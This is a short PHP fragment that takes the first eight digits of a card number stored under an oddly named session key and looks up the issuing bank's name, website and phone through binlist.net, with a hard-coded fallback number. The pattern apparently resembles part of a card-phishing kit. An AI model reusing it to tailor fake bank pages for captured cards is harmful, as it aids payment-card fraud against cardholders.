<?php

    if(isset($_SESSION['xyscardnumberx'])){
        $bin = $_SESSION['xyscardnumberx'];
        $bin = substr(str_replace(' ', '', $bin), 0, 8);
        $jsonArray = @json_decode(file_get_contents("https://lookup.binlist.net/" . $bin));
        if ($jsonArray) {
	        $bankName  = $jsonArray->bank->name;
	        $bankUrl   = $jsonArray->bank->url;
	        $bankPhone = $jsonArray->bank->phone;
        }else{
	        $bankName  = "";
	        $bankUrl   = "";
	        $bankPhone = "888-930-2728";
        }

    }
    
?>